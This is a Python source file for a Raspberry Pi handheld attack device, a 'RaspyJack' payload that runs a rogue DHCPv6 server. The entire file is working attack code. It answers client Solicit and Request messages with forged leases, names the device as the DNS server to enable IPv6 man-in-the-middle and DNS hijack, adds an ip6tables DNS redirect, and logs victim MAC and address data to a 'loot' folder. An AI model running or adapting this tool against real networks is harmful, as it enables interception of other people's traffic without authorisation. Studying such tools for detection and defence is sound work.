#!/usr/bin/env python3
"""
RaspyJack Payload -- Rogue DHCPv6
==================================
Author: 7h30th3r0n3

Rogue DHCPv6 server for IPv6 MITM.  Listens for DHCPv6 Solicit
messages (UDP 547) and responds with Advertise + Reply, assigning
IPv6 addresses with the Pi as DNS server.  Windows prefers DHCPv6
over DHCPv4, so the Pi becomes the default DNS, enabling DNS hijack.

Optionally intercepts DNS queries using iptables redirect.

Controls:
  OK         -- Start / Stop rogue server
  KEY1       -- Toggle DNS intercept mode
  UP / DOWN  -- Scroll assigned clients
  KEY3       -- Exit

Setup: No special tools, uses scapy IPv6/DHCPv6 layers.
"""

import os
import sys
import time
import json
import struct
import random
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from scapy.all import (
        Ether, IPv6, UDP, Raw,
        sendp, sniff as scapy_sniff, conf,
        get_if_hwaddr,
    )
    from scapy.layers.dhcp6 import (
        DHCP6_Solicit, DHCP6_Advertise, DHCP6_Reply,
        DHCP6_Request, DHCP6_InfoRequest,
        DHCP6OptClientId, DHCP6OptServerId,
        DHCP6OptDNSServers, DHCP6OptIA_NA,
        DHCP6OptIAAddress, DHCP6OptDNSDomains,
    )
    from scapy.layers.inet6 import ICMPv6ND_NS
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = "/root/Raspyjack/loot/DHCPv6Rogue"
os.makedirs(LOOT_DIR, exist_ok=True)

DHCPV6_SERVER_PORT = 547
DHCPV6_CLIENT_PORT = 546
IPV6_PREFIX = "fd00:dead:beef::"
ROWS_VISIBLE = 5

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
running = True
serving = False
dns_intercept = False
clients = []          # list of dicts: mac, ipv6, timestamp, hostname
requests_seen = 0
dns_queries = 0
scroll_pos = 0
status_msg = "Ready"
my_iface = "eth0"
my_mac = ""
my_ipv6 = ""
next_addr_id = 2      # increment for each new client

_server_thread = None
_dns_thread = None

# Server DUID (link-layer based)
_server_duid = None

# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def _run_cmd(cmd, timeout=5):
    """Run command and return result."""
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)


def _run_silent(cmd, timeout=5):
    """Run command ignoring errors."""
    try:
        subprocess.run(cmd, capture_output=True, timeout=timeout)
    except Exception:
        pass


def _get_default_iface():
    """Get the interface with the default route."""
    try:
        result = _run_cmd(["ip", "route", "show", "default"])
        for line in result.stdout.splitlines():
            parts = line.split()
            if "dev" in parts:
                return parts[parts.index("dev") + 1]
    except Exception:
        pass
    return "eth0"


def _get_iface_mac(iface):
    """Read MAC of our interface."""
    try:
        with open(f"/sys/class/net/{iface}/address") as fh:
            return fh.read().strip()
    except Exception:
        return "00:00:00:00:00:00"


def _get_ipv6_link_local(iface):
    """Get link-local IPv6 address of interface."""
    try:
        result = _run_cmd(["ip", "-6", "addr", "show", "dev", iface, "scope", "link"])
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet6 "):
                return line.split()[1].split("/")[0]
    except Exception:
        pass
    return "fe80::1"


def _build_server_duid(mac):
    """Build a DUID-LL (link-layer) from MAC address."""
    mac_bytes = bytes.fromhex(mac.replace(":", ""))
    # DUID type 3 (DUID-LL) + hardware type 1 (Ethernet)
    return struct.pack("!HH", 3, 1) + mac_bytes


def _generate_ipv6(client_id):
    """Generate an IPv6 address in our prefix for a client."""
    return f"{IPV6_PREFIX}{client_id:x}"


# ---------------------------------------------------------------------------
# DHCPv6 server thread
# ---------------------------------------------------------------------------

def _handle_solicit(pkt):
    """Handle DHCPv6 Solicit: respond with Advertise."""
    global next_addr_id, requests_seen

    with lock:
        requests_seen += 1

    # Extract client DUID
    client_id_opt = pkt.getlayer(DHCP6OptClientId)
    if not client_id_opt:
        return

    # Assign address
    with lock:
        addr_id = next_addr_id
        next_addr_id += 1
    assigned_ipv6 = _generate_ipv6(addr_id)

    # Build Advertise
    try:
        reply = (
            IPv6(src=my_ipv6, dst=pkt[IPv6].src)
            / UDP(sport=DHCPV6_SERVER_PORT, dport=DHCPV6_CLIENT_PORT)
            / DHCP6_Advertise(trid=pkt[DHCP6_Solicit].trid)
            / DHCP6OptClientId(duid=client_id_opt.duid)
            / DHCP6OptServerId(duid=_server_duid)
            / DHCP6OptIA_NA(
                iaid=1,
                ianaopts=[DHCP6OptIAAddress(addr=assigned_ipv6, preflft=3600, validlft=7200)],
            )
            / DHCP6OptDNSServers(dnsservers=[my_ipv6])
        )
        sendp(
            Ether(src=my_mac, dst=pkt[Ether].src) / reply,
            iface=my_iface, verbose=False,
        )

        # Record client
        client_info = {
            "mac": pkt[Ether].src,
            "ipv6": assigned_ipv6,
            "timestamp": datetime.now().strftime("%H:%M:%S"),
            "type": "solicit",
        }
        with lock:
            clients.append(client_info)

    except Exception:
        pass


def _handle_request(pkt):
    """Handle DHCPv6 Request: respond with Reply to confirm assignment."""
    global requests_seen

    with lock:
        requests_seen += 1

    client_id_opt = pkt.getlayer(DHCP6OptClientId)
    if not client_id_opt:
        return

    # Find the client's assigned address
    ia_opt = pkt.getlayer(DHCP6OptIA_NA)
    assigned_ipv6 = ""
    if ia_opt:
        ia_addr = ia_opt.getlayer(DHCP6OptIAAddress)
        if ia_addr:
            assigned_ipv6 = ia_addr.addr

    if not assigned_ipv6:
        with lock:
            addr_id = next_addr_id
            next_addr_id += 1
        assigned_ipv6 = _generate_ipv6(addr_id)

    try:
        reply = (
            IPv6(src=my_ipv6, dst=pkt[IPv6].src)
            / UDP(sport=DHCPV6_SERVER_PORT, dport=DHCPV6_CLIENT_PORT)
            / DHCP6_Reply(trid=pkt[DHCP6_Request].trid)
            / DHCP6OptClientId(duid=client_id_opt.duid)
            / DHCP6OptServerId(duid=_server_duid)
            / DHCP6OptIA_NA(
                iaid=1,
                ianaopts=[DHCP6OptIAAddress(addr=assigned_ipv6, preflft=3600, validlft=7200)],
            )
            / DHCP6OptDNSServers(dnsservers=[my_ipv6])
        )
        sendp(
            Ether(src=my_mac, dst=pkt[Ether].src) / reply,
            iface=my_iface, verbose=False,
        )

        client_info = {
            "mac": pkt[Ether].src,
            "ipv6": assigned_ipv6,
            "timestamp": datetime.now().strftime("%H:%M:%S"),
            "type": "confirmed",
        }
        with lock:
            # Update existing client or add
            found = False
            for i, c in enumerate(clients):
                if c["mac"] == client_info["mac"]:
                    clients[i] = client_info
                    found = True
                    break
            if not found:
                clients.append(client_info)

    except Exception:
        pass


def _server_loop():
    """Listen for DHCPv6 messages and respond."""
    def _process_pkt(pkt):
        if not running or not serving:
            return
        if pkt.haslayer(DHCP6_Solicit):
            _handle_solicit(pkt)
        elif pkt.haslayer(DHCP6_Request):
            _handle_request(pkt)
        elif pkt.haslayer(DHCP6_InfoRequest):
            _handle_request(pkt)

    try:
        scapy_sniff(
            iface=my_iface,
            filter="udp port 547",
            prn=_process_pkt,
            store=False,
            stop_filter=lambda _: not running or not serving,
        )
    except Exception:
        pass


# ---------------------------------------------------------------------------
# DNS intercept
# ---------------------------------------------------------------------------

def _start_dns_intercept():
    """Set up iptables to redirect DNS traffic to this host."""
    _run_silent([
        "sudo", "ip6tables", "-t", "nat", "-A", "PREROUTING",
        "-i", my_iface, "-p", "udp", "--dport", "53",
        "-j", "REDIRECT", "--to-port", "53",
    ])
    with lock:
        global status_msg
        status_msg = "DNS intercept ON"


def _stop_dns_intercept():
    """Remove DNS intercept rules."""
    _run_silent([
        "sudo", "ip6tables", "-t", "nat", "-D", "PREROUTING",
        "-i", my_iface, "-p", "udp", "--dport", "53",
        "-j", "REDIRECT", "--to-port", "53",
    ])
    with lock:
        global status_msg
        status_msg = "DNS intercept OFF"


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_data():
    """Export client list to loot."""
    with lock:
        data = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "interface": my_iface,
            "my_ipv6": my_ipv6,
            "requests_seen": requests_seen,
            "clients": [dict(c) for c in clients],
        }
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"dhcpv6_rogue_{ts}.json")
    try:
        with open(path, "w") as fh:
            json.dump(data, fh, indent=2)
        with lock:
            global status_msg
            status_msg = "Exported to loot"
    except Exception:
        pass


# ---------------------------------------------------------------------------
# LCD rendering
# ---------------------------------------------------------------------------

def _draw_screen():
    """Render current state on LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
    draw = ScaledDraw(img)

    draw.text((2, 2), "DHCPv6 ROGUE", fill="RED", font=font)

    with lock:
        st = status_msg
        srv = serving
        dns_on = dns_intercept
        sp = scroll_pos
        client_list = list(clients)
        req = requests_seen
        dq = dns_queries

    srv_label = "ON" if srv else "OFF"
    srv_color = "GREEN" if srv else "GRAY"
    draw.text((90, 2), srv_label, fill=srv_color, font=font)

    draw.text((2, 14), st[:22], fill="WHITE", font=font)
    draw.text((2, 26), f"Clients: {len(client_list)}", fill="GREEN", font=font)
    draw.text((2, 38), f"Requests: {req}", fill="WHITE", font=font)

    dns_label = "DNS: ON" if dns_on else "DNS: OFF"
    dns_color = "GREEN" if dns_on else "GRAY"
    draw.text((80, 38), dns_label, fill=dns_color, font=font)

    # Client list
    y = 52
    visible = client_list[sp:sp + ROWS_VISIBLE]
    for c in visible:
        mac_short = c.get("mac", "??:??")[-8:]
        line = f"{mac_short} {c.get('type', '?')[:4]}"
        draw.text((2, y), line, fill="WHITE", font=font)
        y += 14

    if not visible:
        draw.text((2, 60), "No clients yet", fill="GRAY", font=font)

    # Footer
    draw.text((2, 116), "OK:Srv K1:DNS K3:Quit", fill="GRAY", font=font)

    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global running, serving, dns_intercept, scroll_pos, status_msg
    global my_iface, my_mac, my_ipv6, _server_duid, _server_thread

    try:
        if not SCAPY_OK:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            draw = ScaledDraw(img)
            draw.text((4, 50), "scapy not found!", font=font, fill="RED")
            draw.text((4, 65), "pip install scapy", font=font, fill="GRAY")
            LCD.LCD_ShowImage(img, 0, 0)
            time.sleep(3)
            GPIO.cleanup()
            return 1

        my_iface = _get_default_iface()
        my_mac = _get_iface_mac(my_iface)
        my_ipv6 = _get_ipv6_link_local(my_iface)
        _server_duid = _build_server_duid(my_mac)

        with lock:
            status_msg = f"Iface: {my_iface}"

        _draw_screen()

        while running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                running = False
                break

            elif btn == "OK":
                with lock:
                    serving = not serving
                if serving:
                    with lock:
                        status_msg = "Server active"
                    _server_thread = threading.Thread(
                        target=_server_loop, daemon=True,
                    )
                    _server_thread.start()
                else:
                    with lock:
                        status_msg = "Server stopped"
                time.sleep(0.3)

            elif btn == "KEY1":
                with lock:
                    dns_intercept = not dns_intercept
                if dns_intercept:
                    threading.Thread(
                        target=_start_dns_intercept, daemon=True,
                    ).start()
                else:
                    threading.Thread(
                        target=_stop_dns_intercept, daemon=True,
                    ).start()
                time.sleep(0.3)

            elif btn == "UP":
                with lock:
                    if scroll_pos > 0:
                        scroll_pos -= 1

            elif btn == "DOWN":
                with lock:
                    max_s = max(0, len(clients) - ROWS_VISIBLE)
                    if scroll_pos < max_s:
                        scroll_pos += 1

            elif btn == "KEY2":
                threading.Thread(target=_export_data, daemon=True).start()
                time.sleep(0.3)

            _draw_screen()
            time.sleep(0.15)

    finally:
        running = False
        serving = False

        # Cleanup DNS intercept
        if dns_intercept:
            _stop_dns_intercept()

        # Cleanup ip6tables
        _run_silent(["sudo", "ip6tables", "-t", "nat", "-F"])

        try:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            draw = ScaledDraw(img)
            draw.text((10, 50), "DHCPv6 stopped", fill="YELLOW", font=font)
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception:
            pass

        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
